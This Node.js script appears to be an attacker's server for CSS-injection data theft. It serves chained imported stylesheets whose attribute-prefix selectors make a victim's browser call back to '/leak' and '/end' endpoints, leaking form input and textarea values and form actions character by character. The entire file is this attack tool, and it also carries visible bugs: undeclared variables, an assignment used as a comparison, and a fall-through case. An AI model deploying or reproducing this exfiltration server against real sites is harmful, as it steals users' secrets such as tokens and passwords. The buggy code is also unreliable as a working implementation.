const http = require('http');
const url = require('url');
const port = 5001;

const HOSTNAME = "http://localhost:5001";
const ELEMENTS = ["input","textarea","form"];
const ATTRIBUTES = {__proto__:null,"input":["name","value"],"textarea":["name","value"],"form":["action"]};
const MAX_ELEMENTS = 20;
const MAX_VALUE_LEN = 32;
const MAX_FORMS = 4;
const MAX_FORM_ACTION_LEN = 50;

const CHARS = String.fromCodePoint(32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126).split('');

var pending = [];
var stop = false, ready = 0, n = 0, prefixes = {__proto__:null};
var inputCount = 0, textareaCount = 0, formCount = 0, tokens = [];

const requestHandler = (request, response) => {
    let req = url.parse(request.url, url);
    if (stop) return response.end();
    switch (req.pathname) {
        case "/start":
            completedCount = 0;
            inputCount = 0;
            textareaCount = 0;
            formCount = 0;
            n = 0;
            tokens = [];
            prefixes = {__proto__:null};
            stop = false;
            ready = 0;
            pending = [];
            genResponse(response);
        break;
        case "/logCount":
            response.end();
            if(req.query.inputCount) {
                inputCount = req.query.inputCount;
            }
            if(req.query.textareaCount) {
                textareaCount = req.query.textareaCount;
            }
            if(req.query.formCount) {
                formCount = req.query.formCount;
            }
            break;
        case "/leak":
            response.end();
            let hasChanged = false;
            for (const [element, attributeList] of Object.entries(ATTRIBUTES)) {
                for(const attribute of attributeList) {                  
                    const value = prefixes['p_'+element+attribute];     
                    if(req.query['p_'+element+attribute] !== value) {
                        prefixes['p_'+element+attribute] = req.query['p_'+element+attribute];
                        hasChanged = true;
                    }
                }
            }
            if (!hasChanged) {
                break;
            }
            if (ready == 2) {
                genResponse(pending.shift());
                ready = 0;
            } else {
                ready++;
                console.log('\tleak: waiting others...');
            }
        break;
        case "/next":
            if (ready == 2) {
                genResponse(response);
                ready = 0;
            } else {
                pending.push(response);
                ready++;
                console.log('\tquery: waiting others...');
            }
        break;
        case "/end":
            let total = inputCount + textareaCount + formCount;
            let actualInputCount = 0, actualTextareaCount = 0, actualFormCount = 0, currentTextareaCount = 0, currentInputCount = 0;
            for (const [element, attributeList] of Object.entries(ATTRIBUTES)) {
                for(const attribute of attributeList) {               
                    const value = tokens.find(e => e.element = element && e.attribute === attribute).token;
                    if(req.query['token'+element+attribute] !== value) {
                        let token = req.query['token'+element+attribute];
                        tokens.push({element,attribute,token});
                        if(element === 'form') {
                            actualFormCount++;
                        } else if(element === 'input') {
                            currentInputCount++;
                        } else if(element === 'textarea') {
                            currentTextareaCount++;
                        }
                    }                
                }
            }

            actualInputCount = Math.floor(currentInputCount / 2);
            actualTextareaCount = Math.floor(currentTextareaCount / 2);

            if(actual === total) {
                stop = true;
                console.log('[+] END: %s', tokens);
            }
        default:
            response.end();
    }
}

const genResponse = (response) => {
    let css = '@import url('+ HOSTNAME + '/next?' + Date.now() + ');';
    let properties = [];
    for(let element of ELEMENTS) {
        for(let attribute of ATTRIBUTES[element]) {           
            const variablePrefix = '--'+element[0]+'-'+attribute+'-';  
            const prefix = typeof prefixes['p_'+element+attribute] === 'undefined' ? "" : prefixes['p_'+element+attribute];             
            css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"])' + '{'+variablePrefix+'s'+n+':url(' + HOSTNAME + '/leak?p_'+element+attribute+'=' + encodeURIComponent(prefix + e) +');}')).join('');
            if(n === 0) {                            
                for(let i=1;i<=(element === "form" ? MAX_FORM_ACTION_LEN : MAX_VALUE_LEN);i++) {                              
                    properties.push('var('+variablePrefix+'s'+n+',none)');
                }
                properties.push('var('+variablePrefix+'full-token,none)');   
            }
            css += 'html:has(['+attribute+'="'+ prefix + '"]){'+variablePrefix+'full-token:url(' + HOSTNAME + '/end?token'+element+attribute+'=' + encodeURIComponent(prefix) + ');}';
        }
    }
    if(n === 0) {  
        css += `html{background:${properties.join(',')};}`;
    }
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
    n++;
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
})

function escapeCSS(str) {
    return str.replace(/(["\\])/,'\\$1');
}